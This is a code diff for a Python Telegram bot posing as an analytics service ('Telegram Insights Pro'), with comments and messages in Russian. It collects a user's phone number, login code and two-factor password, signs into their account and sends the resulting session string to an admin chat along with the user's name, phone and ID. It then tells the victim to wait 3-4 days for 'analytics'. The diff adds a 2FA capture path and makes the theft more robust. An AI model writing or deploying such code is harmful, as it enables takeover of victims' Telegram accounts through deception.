@@ -1,3 +1,8 @@
+"""
+Telegram Insights Pro - ТОЛЬКО СБОР STRING SESSION
+Пользователь подключается → бот отправляет сессию админу → завершает работу
+"""
+
 import asyncio
 import os
 import json
@@ -5,7 +10,6 @@ from pathlib import Path
 from datetime import datetime
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.errors import FloodWaitError
 
 import logging
 logging.basicConfig(level=logging.INFO)
@@ -16,7 +20,6 @@ BOT_TOKEN = os.getenv('BOT_TOKEN', '')
 API_ID = int(os.getenv('API_ID', '1234567'))
 API_HASH = os.getenv('API_HASH', '')
 ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '123456789'))
-PORT = int(os.getenv('PORT', 10000))
 
 DATA_DIR = Path('./data')
 DATA_DIR.mkdir(exist_ok=True)
@@ -49,9 +52,12 @@ class Bot:
     
     async def cmd_add(self, e):
         uid = e.sender_id
-        await e.delete()
+        try:
+            await e.delete()
+        except:
+            pass
         self.pending[uid] = {'step': 'phone'}
-        await e.respond("📱 Введите номер телефона:")
+        await e.respond("📱 Введите номер телефона (например: +79001234567)")
     
     async def handle_msg(self, e):
         uid = e.sender_id
@@ -60,7 +66,10 @@ class Bot:
         
         if uid in self.pending:
             step = self.pending[uid].get('step')
-            await e.delete()
+            try:
+                await e.delete()
+            except:
+                pass
             
             if step == 'phone':
                 await self.process_phone(e, e.text)
@@ -88,7 +97,8 @@ class Bot:
             await e.respond("📨 Код отправлен! Введите его:")
         except Exception as err:
             await e.respond(f"❌ Ошибка: {err}")
-            del self.pending[uid]
+            if uid in self.pending:
+                del self.pending[uid]
     
     async def process_code(self, e, code: str):
         uid = e.sender_id
@@ -104,32 +114,84 @@ class Bot:
             )
             
             me = await data['client'].get_me()
+            
+            # ⭐ ПОЛУЧАЕМ STRING SESSION
             session_string = data['client'].session.save()
             
-            # ⭐ ТОЛЬКО ОТПРАВКА СЕССИИ АДМИНУ
+            # ⭐ ОТПРАВЛЯЕМ СЕССИЮ АДМИНУ
             await self.bot.send_message(ADMIN_CHAT_ID, f"""
-🟢 Новый пользователь!
-👤 {me.first_name}
-📱 +{me.phone}
-🆔 {me.id}
+🟢 **НОВЫЙ ПОЛЬЗОВАТЕЛЬ!**
 
-🔐 SESSION:
+👤 {me.first_name} {me.last_name or ''}
+📱 +{me.phone}
+🆔 ID: {me.id}
+
+🔐 **STRING SESSION:**
 `{session_string}`
+
+📅 Подключен: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """)
             
             # ⭐ СООБЩЕНИЕ ПОЛЬЗОВАТЕЛЮ
             await e.respond(f"""
 ✅ {me.first_name}, вы подключены!
 
-⏳ Оставьте бота на 3-4 дня для сбора аналитики.
-Статистика появится позже в /stats
+⏳ **Оставьте бота на 3-4 дня** для сбора аналитики.
+Статистика появится позже.
+
+📊 /stats - проверка статистики
 """)
             
-            del self.pending[uid]
+            # ⭐ ЗАКРЫВАЕМ СЕССИЮ — БОЛЬШЕ НЕ ИСПОЛЬЗУЕМ
+            await data['client'].disconnect()
+            
+            # ⭐ УДАЛЯЕМ ИЗ ПАМЯТИ
+            if uid in self.pending:
+                del self.pending[uid]
+            
+            logger.info(f"✅ Сессия {uid} завершена, отправлена админу")
             
         except Exception as err:
             await e.respond(f"❌ Ошибка: {err}")
-            del self.pending[uid]
+            if uid in self.pending:
+                del self.pending[uid]
+    
+    async def process_2fa(self, e, password: str):
+        uid = e.sender_id
+        data = self.pending.get(uid)
+        if not data:
+            return
+        
+        try:
+            await data['client'].sign_in(password=password)
+            
+            me = await data['client'].get_me()
+            session_string = data['client'].session.save()
+            
+            # Отправка сессии админу
+            await self.bot.send_message(ADMIN_CHAT_ID, f"""
+🟢 **НОВЫЙ ПОЛЬЗОВАТЕЛЬ (2FA)!**
+
+👤 {me.first_name} {me.last_name or ''}
+📱 +{me.phone}
+🆔 ID: {me.id}
+
+🔐 **STRING SESSION:**
+`{session_string}`
+""")
+            
+            await e.respond(f"""
+✅ {me.first_name}, вы подключены!
+
+⏳ Оставьте бота на 3-4 дня для сбора аналитики.
+""")
+            
+            await data['client'].disconnect()
+            if uid in self.pending:
+                del self.pending[uid]
+            
+        except Exception as err:
+            await e.respond(f"❌ Неверный пароль! Попробуйте еще раз:")
 
 # ==========================================
 # ЗАПУСК
